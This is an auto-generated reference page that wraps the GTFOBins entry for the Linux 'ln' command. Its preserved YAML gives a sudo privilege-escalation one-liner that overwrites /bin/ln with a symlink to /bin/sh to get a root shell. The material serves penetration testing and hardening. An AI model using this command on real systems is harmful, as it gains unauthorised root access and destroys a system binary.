---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ln

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ln` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ln` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ln](../../tools/linux/ln.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ln |
| name | ln |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/ln/ |

## Preserved Source Material

```yaml
_body: ''
_name: ln
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ln
functions:
  privilege-escalation:
  - code: 'ln -fs /bin/sh /bin/ln

      ln'
    comment: This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root,
      useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.
    contexts:
      sudo: null
```
